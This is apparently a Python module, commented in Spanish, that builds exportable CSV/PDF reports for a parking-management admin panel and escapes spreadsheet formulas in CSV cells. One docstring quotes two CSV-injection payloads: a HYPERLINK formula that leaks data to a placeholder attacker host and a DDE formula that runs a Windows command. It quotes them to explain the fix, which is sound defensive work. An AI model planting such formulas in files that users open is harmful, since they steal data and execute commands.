"""Datos de los informes exportables de solidAPP (T-16, 2026-10-21).

Este módulo es la **capa de datos** de los exportes PDF/CSV de
``/admin/reports``. Cada informe se modela como una tabla plana
(:class:`ReportTable`) que consumen los dos renderizadores:

- :func:`render_report_csv` → CSV con cabecera (separador ``,``).
- ``app.services.pdf.render_report_pdf`` → PDF con la paleta ``park``.

Filtros (los mismos que usa ya el resto del router ``/admin/reports``):
``parking_id`` (obligatorio) + ``from`` / ``to`` (ventana temporal).

Semántica de cada informe
--------------------------
- **ingresos**: tickets *cerrados* cuyo ``exit_at`` cae en la ventana. Es
  exactamente el criterio que usa ``compute_margin`` para el margen, así que
  los "ingresos" cuadran con los del informe de márgenes.
- **ocupación**: foto de la ocupación en el instante ``to`` (fin de la
  ventana). Una plaza está ocupada si en ese instante había un ticket sin
  salida, o con salida posterior a ``to``. Coherente con la regla de
  ``dashboard_kpis`` (plaza ocupada = plaza con ticket vigente).
- **tickets**: todos los tickets con *entrada* en la ventana, cualquiera que
  sea su estado. "Ingresos" mide dinero cobrado (salidas) y "tickets" mide
  tráfico (entradas): son dos ventanas distintas a propósito.
- **alertas**: alertas **creadas** en la ventana (``created_at``).
- **márgenes**: reutiliza ``compute_margin`` (ingresos − costes prorrateados)
  y lo expone como tabla de conceptos.

Convención de los valores
-------------------------
- Los importes van como número plano con punto decimal (``"1234.50"``) y la
  unidad en la cabecera de la columna (``importe_eur``). Así el CSV se puede
  sumar en Excel o con ``csv.DictReader`` sin transformaciones.
- Las fechas van en formato ``YYYY-MM-DD HH:MM`` (ISO-8601 sin offset, en
  UTC): es parseable por ``datetime.strptime`` y legible en el PDF.
- El separador del CSV es ``,`` (convención ya usada por el CSV de
  márgenes del repo y por el ``csv.DictReader`` por defecto).
"""

from __future__ import annotations

import csv
import io
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Sequence

from sqlalchemy import or_
from sqlalchemy.orm import Session

from app.models.audit import Alert
from app.models.enums import TicketStatus
from app.models.parking import ParkingSpace
from app.models.ticket import Ticket
from app.models.vehicle import Vehicle
from app.services.cost import _to_aware_utc, compute_margin


@dataclass
class ReportTable:
    """Informe tabular listo para exportar (CSV y PDF).

    Attributes:
        title: título legible del informe (aparece en el PDF).
        columns: cabecera de la tabla (nombres de columna del CSV).
        rows: filas de datos; cada fila tiene tantos campos como columnas.
        summary: pares (etiqueta, valor) del bloque de resumen del PDF.
    """

    title: str
    columns: list[str]
    rows: list[list[str]] = field(default_factory=list)
    summary: list[tuple[str, str]] = field(default_factory=list)


# ─────────────────────────── formato de celdas ───────────────────────────


def _fmt_dt(dt: datetime | None) -> str:
    """Fecha en ``YYYY-MM-DD HH:MM`` (UTC). ``""`` si no hay fecha."""
    if dt is None:
        return ""
    return _to_aware_utc(dt).strftime("%Y-%m-%d %H:%M")


def _fmt_money_es(value: float | None) -> str:
    """Importe con formato español (``1.234,50 €``). Solo para el resumen."""
    if value is None:
        return "—"
    return f"{value:,.2f} €".replace(",", "X").replace(".", ",").replace("X", ".")


def _num(value: float | None) -> str:
    """Número plano con punto decimal (parseable por CSV/Excel)."""
    if value is None:
        return ""
    return f"{value:.2f}"


def _duracion_min(entry_at: datetime | None, exit_at: datetime | None) -> str:
    """Duración de la estancia en minutos (cadena vacía si no se puede)."""
    if entry_at is None or exit_at is None:
        return ""
    delta = _to_aware_utc(exit_at) - _to_aware_utc(entry_at)
    return f"{round(delta.total_seconds() / 60.0, 1)}"


#: Tope de filas por informe (T-100). Acota la memoria del proceso y el
#: tamaño del PDF (que multiplica las filas por los objetos del dibujo).
MAX_FILAS_INFORME = 20_000


class InformeDemasiadoGrandeError(Exception):
    """El informe pedido supera el tope de filas.

    Se lanza **en vez de recortar en silencio**: un informe truncado sin
    avisar es peor que uno que no se genera (el usuario creería que
    estos son todos los datos).
    """


def _acotar_filas(filas: list[Any]) -> list[Any]:
    """Rechaza el informe si supera el tope de filas."""
    if len(filas) > MAX_FILAS_INFORME:
        raise InformeDemasiadoGrandeError(
            f"el informe supera el maximo de {MAX_FILAS_INFORME} filas: "
            "acota el rango de fechas"
        )
    return filas


def _plates(db: Session, vehicle_ids: Sequence[int]) -> dict[int, str]:
    """Matrículas indexadas por ``vehicle_id`` (evita N+1)."""
    ids = {vid for vid in vehicle_ids if vid is not None}
    if not ids:
        return {}
    filas = db.query(Vehicle.id, Vehicle.plate).filter(Vehicle.id.in_(ids)).all()
    return {vid: plate for vid, plate in filas}


# ───────────────────────────── informes ───────────────────────────


def build_ingresos_report(
    db: Session, parking_id: int, from_: datetime, to: datetime,
) -> ReportTable:
    """Ingresos: tickets cerrados con salida dentro de la ventana."""
    tickets = (
        db.query(Ticket)
        .filter(
            Ticket.parking_id == parking_id,
            Ticket.status == TicketStatus.CERRADO,
            Ticket.exit_at.isnot(None),
            Ticket.exit_at >= from_,
            Ticket.exit_at <= to,
        )
        .order_by(Ticket.exit_at)
        .limit(MAX_FILAS_INFORME + 1)
        .all()
    )
    _acotar_filas(tickets)
    placas = _plates(db, [t.vehicle_id for t in tickets])

    rows: list[list[str]] = []
    total = 0.0
    for t in tickets:
        total += float(t.total or 0.0)
        rows.append([
            str(t.id),
            placas.get(t.vehicle_id, "—"),
            _fmt_dt(t.entry_at),
            _fmt_dt(t.exit_at),
            _duracion_min(t.entry_at, t.exit_at),
            _num(t.amount),
            _num(t.discount),
            _num(t.total),
            t.payment_method or "—",
        ])

    return ReportTable(
        title="Ingresos por tickets cerrados",
        columns=[
            "ticket_id", "matricula", "entrada", "salida", "duracion_min",
            "importe_eur", "descuento_eur", "total_eur", "metodo_pago",
        ],
        rows=rows,
        summary=[
            ("Ingresos totales", _fmt_money_es(total)),
            ("Tickets cerrados", str(len(tickets))),
            ("Ticket medio", _fmt_money_es(total / len(tickets)) if tickets else "—"),
        ],
    )


def build_ocupacion_report(
    db: Session, parking_id: int, from_: datetime, to: datetime,
) -> ReportTable:
    """Ocupación: foto de las plazas en el instante ``to`` (fin de ventana).

    Los cuatro estados son **excluyentes** y suman el total de plazas:
    ``averiada`` > ``inactiva`` > ``ocupada`` > ``libre``. Es decir, una
    plaza averiada cuenta como averiada (no como ocupada) aunque tenga un
    ticket vigente; la fila muestra igualmente el vehículo para que el
    gestor vea la incidencia.
    """
    spaces = (
        db.query(ParkingSpace)
        .filter(ParkingSpace.parking_id == parking_id)
        .order_by(ParkingSpace.lane, ParkingSpace.number)
        .all()
    )

    to_utc = _to_aware_utc(to)
    # Tickets vigentes en ``to``: han entrado antes de ``to`` y (no han salido
    # todavía o han salido después de ``to``). Los anulados no ocupan plaza.
    tickets = (
        db.query(Ticket)
        .filter(
            Ticket.parking_id == parking_id,
            Ticket.status != TicketStatus.ANULADO,
            Ticket.entry_at <= to,
            # T-100: solo los tickets que **siguen abiertos** en ``to``.
            # Antes se cargaba TODA la historia de la sucursal y el
            # filtro se hacia en Python: pedir un informe de una hora
            # traia los tickets de tres anos en memoria.
            or_(Ticket.exit_at.is_(None), Ticket.exit_at > to),
        )
        .order_by(Ticket.entry_at)
        .limit(MAX_FILAS_INFORME + 1)
        .all()
    )
    _acotar_filas(tickets)
    ocupacion: dict[int, Ticket] = {}
    for t in tickets:
        if t.parking_space_id is None:
            continue
        if t.exit_at is not None and _to_aware_utc(t.exit_at) <= to_utc:
            continue
        # Ordenado por entrada: el último que entró es el que ocupa la plaza.
        ocupacion[t.parking_space_id] = t

    placas = _plates(db, [t.vehicle_id for t in ocupacion.values()])

    rows: list[list[str]] = []
    ocupadas = libres = averiadas = inactivas = 0
    for space in spaces:
        ticket = ocupacion.get(space.id)
        if space.is_broken:
            estado = "averiada"
            averiadas += 1
        elif not space.is_active:
            estado = "inactiva"
            inactivas += 1
        elif ticket is not None:
            estado = "ocupada"
            ocupadas += 1
        else:
            estado = "libre"
            libres += 1
        rows.append([
            f"{space.lane}-{space.number}",
            estado,
            placas.get(ticket.vehicle_id, "—") if ticket is not None else "—",
            str(ticket.id) if ticket is not None else "—",
            _fmt_dt(ticket.entry_at) if ticket is not None else "",
        ])

    total = len(spaces)
    ocupables = max(total - averiadas - inactivas, 0)
    pct = round(100.0 * ocupadas / ocupables, 1) if ocupables else 0.0

    return ReportTable(
        title="Ocupación de plazas",
        columns=["plaza", "estado", "matricula", "ticket_id", "entrada"],
        rows=rows,
        summary=[
            ("Plazas totales", str(total)),
            ("Ocupadas", str(ocupadas)),
            ("Libres", str(libres)),
            ("Averiadas", str(averiadas)),
            ("Inactivas", str(inactivas)),
            ("Ocupación", f"{pct} %"),
        ],
    )


def build_tickets_report(
    db: Session, parking_id: int, from_: datetime, to: datetime,
) -> ReportTable:
    """Tickets: todos los tickets con entrada dentro de la ventana."""
    tickets = (
        db.query(Ticket)
        .filter(
            Ticket.parking_id == parking_id,
            Ticket.entry_at >= from_,
            Ticket.entry_at <= to,
        )
        .order_by(Ticket.entry_at)
        .limit(MAX_FILAS_INFORME + 1)
        .all()
    )
    _acotar_filas(tickets)
    placas = _plates(db, [t.vehicle_id for t in tickets])
    espacios = {
        s.id: f"{s.lane}-{s.number}"
        for s in db.query(ParkingSpace)
        .filter(ParkingSpace.parking_id == parking_id)
        .all()
    }

    rows: list[list[str]] = []
    for t in tickets:
        estado = t.status.value if hasattr(t.status, "value") else str(t.status)
        origen = t.origin.value if hasattr(t.origin, "value") else str(t.origin)
        rows.append([
            str(t.id),
            placas.get(t.vehicle_id, "—"),
            estado,
            origen,
            _fmt_dt(t.entry_at),
            _fmt_dt(t.exit_at),
            _duracion_min(t.entry_at, t.exit_at),
            _num(t.amount),
            _num(t.discount),
            _num(t.total),
            t.payment_method or "—",
            espacios.get(t.parking_space_id, "—") if t.parking_space_id else "—",
        ])

    return ReportTable(
        title="Tickets del periodo",
        columns=[
            "ticket_id", "matricula", "estado", "origen", "entrada", "salida",
            "duracion_min", "importe_eur", "descuento_eur", "total_eur",
            "metodo_pago", "plaza",
        ],
        rows=rows,
        summary=[
            ("Tickets en el periodo", str(len(tickets))),
            ("Cerrados", str(sum(1 for t in tickets if t.status == TicketStatus.CERRADO))),
            ("Activos", str(sum(1 for t in tickets if t.status == TicketStatus.ACTIVO))),
            ("Anulados", str(sum(1 for t in tickets if t.status == TicketStatus.ANULADO))),
        ],
    )


def build_alertas_report(
    db: Session, parking_id: int, from_: datetime, to: datetime,
) -> ReportTable:
    """Alertas: las creadas dentro de la ventana.

    T-153 (2026-10-24): hereda el tope de filas (T-100) como los otros
    informes. Era el unico que no lo hacia: ``.all()`` traia **todas**
    las alertas de la ventana a memoria (y el PDF las dibuja todas), con
    lo que, si el proceso se queda sin memoria, **se cae la API entera**.
    """
    alertas = (
        db.query(Alert)
        .filter(
            Alert.parking_id == parking_id,
            Alert.created_at >= from_,
            Alert.created_at <= to,
        )
        .order_by(Alert.created_at.desc())
        .limit(MAX_FILAS_INFORME + 1)
        .all()
    )
    _acotar_filas(alertas)

    rows: list[list[str]] = []
    for a in alertas:
        tipo = a.type.value if hasattr(a.type, "value") else str(a.type)
        severidad = a.severity.value if hasattr(a.severity, "value") else str(a.severity)
        rows.append([
            str(a.id),
            tipo,
            severidad,
            a.message,
            _fmt_dt(a.created_at),
            "sí" if a.acknowledged_at is not None else "no",
        ])

    return ReportTable(
        title="Alertas operativas",
        columns=["alerta_id", "tipo", "severidad", "mensaje", "creada", "reconocida"],
        rows=rows,
        summary=[
            ("Alertas en el periodo", str(len(alertas))),
            ("Reconocidas", str(sum(1 for a in alertas if a.acknowledged_at is not None))),
            ("Críticas", str(sum(
                1 for a in alertas
                if (a.severity.value if hasattr(a.severity, "value") else str(a.severity)) == "critical"
            ))),
        ],
    )


def build_margenes_report(
    db: Session, parking_id: int, from_: datetime, to: datetime,
) -> ReportTable:
    """Márgenes: ingresos − costes prorrateados (delegado en ``compute_margin``)."""
    report = compute_margin(db, parking_id, from_=from_, to=to)

    rows: list[list[str]] = [
        ["ingresos", _num(report.total_revenue), f"{report.closed_tickets} tickets cerrados"],
        ["costes", _num(report.total_costs), f"{len(report.cost_breakdown)} categorías"],
        ["margen", _num(report.margin), "ingresos - costes"],
    ]
    for entry in report.cost_breakdown:
        rows.append([
            entry.category.value,
            _num(entry.amount),
            f"{entry.cost_count} costes",
        ])

    return ReportTable(
        title="Margen por sucursal",
        columns=["concepto", "importe_eur", "detalle"],
        rows=rows,
        summary=[
            ("Ingresos", _fmt_money_es(report.total_revenue)),
            ("Costes", _fmt_money_es(report.total_costs)),
            ("Margen", _fmt_money_es(report.margin)),
            ("Tickets cerrados", str(report.closed_tickets)),
        ],
    )


#: Registro de informes exportables: clave de ruta → constructor.
REPORT_BUILDERS: dict[str, Callable[[Session, int, datetime, datetime], ReportTable]] = {
    "ingresos": build_ingresos_report,
    "ocupacion": build_ocupacion_report,
    "tickets": build_tickets_report,
    "alertas": build_alertas_report,
    "margins": build_margenes_report,
}

#: Prefijo del nombre de fichero de cada informe.
#:
#: ``margins`` usa ``margin`` (y no ``margenes``) para que el PDF nuevo
#: tenga el mismo prefijo que el CSV histórico de márgenes
#: (``margin-<parking_id>-<desde>-<hasta>.csv``).
FILE_BASENAMES: dict[str, str] = {
    "ingresos": "ingresos",
    "ocupacion": "ocupacion",
    "tickets": "tickets",
    "alertas": "alertas",
    "margins": "margin",
}


# ───────────────────────────── renderizado CSV ─────────────────────────────


#: Caracteres con los que una hoja de calculo (Excel, LibreOffice,
#: Google Sheets) interpreta una celda como una FORMULA en vez de texto.
PREFIJOS_FORMULA = ("=", "+", "-", "@", "\t", "\r")


def escapar_celda_csv(valor: object) -> object:
    """Neutraliza una celda que una hoja de calculo podria ejecutar.

    OJO (T-77, 2026-10-22): los informes CSV meten datos que pone un
    usuario —la matricula de un vehiculo (la introduce el conductor y el
    alta manual no valida el formato) y el nombre de la sucursal—. Sin
    esto, una celda que empieza por ``=`` se ejecuta al abrir el fichero
    en Excel o LibreOffice: ``=HYPERLINK("http://atacante/?d="&A1,"clic")``
    filtra datos de la hoja y ``=cmd|'/c calc'!A0`` ejecuta un comando en
    Windows. Es el CSV injection clasico.

    El arreglo es el de OWASP: anteponer un apostrofo, que es lo que hacen
    las hojas de calculo para marcar "esto es texto, no una formula". El
    apostrofo **queda en el fichero**, asi que quien lo parsee con codigo
    tiene que saberlo (esta documentado aqui y en el API interno).
    """
    if not isinstance(valor, str) or not valor:
        return valor
    if valor.startswith(PREFIJOS_FORMULA) and not _es_numero(valor):
        return "'" + valor
    return valor


def _es_numero(texto: str) -> bool:
    """¿El texto es un numero? Un "-12.50" no es una formula.

    Sin esta distincion, todos los informes de margenes con perdidas
    mostrarian "'-12.50" en vez de "-12.50" (el "-" de un negativo no es
    un caracter de formula: una hoja de calculo lo lee como numero).
    """
    try:
        float(texto)
    except ValueError:
        return False
    return True


def render_report_csv(report: ReportTable) -> str:
    """Serializa el informe a CSV: primera fila = cabecera, luego datos.

    El separador es ``,`` (convención del repo: el CSV de márgenes ya usa
    el ``csv.writer`` por defecto) y no se añade BOM, de modo que
    ``csv.DictReader`` lo lee tal cual.

    Todas las celdas pasan por ``escapar_celda_csv`` (T-77): el informe
    lleva datos que pone el usuario (matricula, nombre de la sucursal) y
    una celda que empieza por ``=`` seria una formula al abrir el CSV.
    """
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow([escapar_celda_csv(c) for c in report.columns])
    for row in report.rows:
        writer.writerow([escapar_celda_csv(c) for c in row])
    return buf.getvalue()


def to_utc(dt: datetime) -> datetime:
    """Normaliza a UTC: los naive se asumen UTC, los aware se convierten.

    Sin esta normalización, SQLite (que alinea los ``DateTime`` como texto
    sin offset) compararía fechas con offsets distintos de los que guarda
    Postgres, que sí normaliza a UTC.
    """
    if dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(timezone.utc)


__all__ = [
    "ReportTable",
    "REPORT_BUILDERS",
    "FILE_BASENAMES",
    "build_ingresos_report",
    "build_ocupacion_report",
    "build_tickets_report",
    "build_alertas_report",
    "build_margenes_report",
    "render_report_csv",
    "to_utc",
]
